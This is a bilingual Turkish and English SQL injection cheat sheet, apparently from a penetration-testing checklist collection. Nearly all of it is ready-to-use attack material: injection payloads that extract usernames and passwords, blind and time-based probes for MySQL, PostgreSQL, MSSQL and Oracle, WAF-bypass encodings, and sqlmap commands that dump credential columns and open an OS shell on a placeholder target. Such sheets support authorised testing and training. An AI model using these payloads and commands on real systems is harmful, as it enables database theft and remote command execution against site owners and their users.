# 💉 SQL Injection

## 🇹🇷 Türkçe

### Kontrol Listesi

| # | Test | Açıklama | Durum |
|---|------|----------|-------|
| 1 | Error-based | Hata mesajlarından veri | ⬜ |
| 2 | Union-based | UNION ile veri çekme | ⬜ |
| 3 | Blind (Boolean) | True/False farkları | ⬜ |
| 4 | Blind (Time) | Zaman gecikmesi | ⬜ |
| 5 | Out-of-band | DNS/HTTP exfiltration | ⬜ |
| 6 | Second-order | Kayıtlı veri ile injection | ⬜ |

### Tespit Payloads

```sql
'
"
`
')
")
`)
'))
"))
`))
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' ORDER BY 1--
1' ORDER BY 10--
```

### Union-based SQLi

```sql
# Kolon sayısını bul
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (hata verene kadar)

# UNION ile test
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Veri çek
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--

# Veritabanı bilgisi (MySQL)
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT database(),NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi (Boolean)

```sql
# True/False kontrolü
' AND 1=1--  (normal sayfa)
' AND 1=2--  (farklı sayfa)

# Karakter tespiti
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>97--
```

### Blind SQLi (Time-based)

```sql
# MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# PostgreSQL
'; SELECT pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--

# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### Komutlar

```bash
# SQLMap - Temel kullanım
sqlmap -u "http://target.com/page?id=1" --dbs

# SQLMap - POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# SQLMap - Cookie ile
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --dbs

# SQLMap - Veritabanlarını listele
sqlmap -u "http://target.com/page?id=1" --dbs

# SQLMap - Tabloları listele
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# SQLMap - Kolonları listele
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns

# SQLMap - Veri dump
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump

# SQLMap - OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQLMap - WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
```

### WAF Bypass Teknikleri

```sql
# Boşluk bypass
/**/
%20
%09
%0a
%0d
+

# Keyword bypass
SeLeCt (mixed case)
SEL/**/ECT (comment)
CONCAT('SEL','ECT') (concat)

# Örnek
1'/**/UNION/**/SELECT/**/1,2,3--
1'%09UNION%09SELECT%091,2,3--
```

---

## 🇬🇧 English

### Checklist

| # | Test | Description | Status |
|---|------|-------------|--------|
| 1 | Error-based | Data from errors | ⬜ |
| 2 | Union-based | Data via UNION | ⬜ |
| 3 | Blind (Boolean) | True/False differences | ⬜ |
| 4 | Blind (Time) | Time delays | ⬜ |
| 5 | Out-of-band | DNS/HTTP exfiltration | ⬜ |
| 6 | Second-order | Stored data injection | ⬜ |

### Quick Commands

```bash
# SQLMap basic
sqlmap -u "http://target.com/page?id=1" --dbs

# Full dump
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

[← Back to README](../README.md)
